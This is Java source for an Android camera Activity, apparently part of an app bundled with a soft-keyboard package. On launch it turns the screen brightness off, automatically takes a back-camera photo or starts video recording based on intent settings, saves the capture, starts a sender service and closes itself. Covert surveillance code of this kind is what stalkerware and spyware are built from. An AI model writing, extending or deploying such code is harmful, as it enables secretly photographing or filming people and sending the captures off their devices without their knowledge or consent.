package com.acme.activity;

import android.app.Activity;
import android.content.Intent;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.view.*;
import android.widget.Button;
import com.acme.util.*;
import com.softkeyboard.R;

import java.io.FileOutputStream;
import java.io.IOException;

public class MediaActivity extends Activity implements SurfaceHolder.Callback{

    MediaConfig config = new MediaConfig();

    Window window;
    WindowManager.LayoutParams params;

    private Button videoCapture;
    private Button imageCapture;


    private SurfaceView cameraPreview;

    private MediaRecorder mediaRecorder;
    private SurfaceHolder holder;
    private Camera camera;
    private Camera.PictureCallback jpegCallback;

    private boolean previewIsRunning;
    private boolean firstLunch = true;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(!isFinishing()){
            setContentView(R.layout.media);
            videoCapture = (Button)findViewById(R.id.video_capture);
            imageCapture = (Button)findViewById(R.id.image_capture);
            cameraPreview = (SurfaceView)findViewById(R.id.camera_preview);
            switchBrightness();
            initialize();
        }
    }

    private void initialize() {
        holder = cameraPreview.getHolder();
        holder.addCallback(this);

        //listener for video button
        videoCapture.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                System.out.println("videoCapture");
                record();
            }
        });

        //listener for image button
        imageCapture.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                System.out.println("image capture");
                captureImage();
            }
        });

        //image capture callback
        jpegCallback = new Camera.PictureCallback() {
            public void onPictureTaken(byte[] data, Camera camera) {
                System.out.println("Picture size in bytes: " + data.length);
                try {
                    //write to file
                    String path = RecordHelper.getPathForImage();
                    FileOutputStream out = new FileOutputStream(path);
                    out.write(data);
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                safeStopPreview();
                Utils.startSenderService();
                finish();
            }
        };
    }

    private void record(){
        new Thread ( new StartRecord (mediaRecorder,camera,holder,this)).start();
    }

    public void surfaceCreated(SurfaceHolder holder) {
        System.out.println("surfaceCreated");
        camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        System.out.println("surfaceChanged");
        try {
            camera.setPreviewDisplay(holder);
            safeStartPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        System.out.println("surfaceDestroyed");
        safeStopPreview();
        camera.release();
        camera = null;
    }

    private void safeStartPreview() {
        if (!previewIsRunning && (camera != null)) {
            camera.startPreview();
            previewIsRunning = true;
            if(firstLunch){
                captureMedia();         //after all done, init action
                firstLunch = false;
            }

        }
    }

    // same for stopping the preview
    private void safeStopPreview() {
        if (previewIsRunning && (camera != null)) {
            camera.stopPreview();
            previewIsRunning = false;
        }
    }

    //main method foe capturing media data
    private void captureMedia(){
        System.out.println("capture media");
        Intent intent = getIntent();
        if(intent!=null){
            config.readIntent(intent);
        }

        if(config.isPictureMode()){
            System.out.println("capture image");
            captureImage();
        } else {
            record();
        }
    }

    //make backward camera picture
    private void captureImage(){
        //TODO: use flashlight
        Camera.Parameters params = camera.getParameters();
        params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
        camera.setParameters(params);
        camera.takePicture(null, null, null,jpegCallback);
    }

    private void switchBrightness(){
        System.out.println("screen off");
        window = getWindow();
        params = window.getAttributes();
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_OFF;
        getWindow().setAttributes(params);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(mediaRecorder!=null){
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }

}

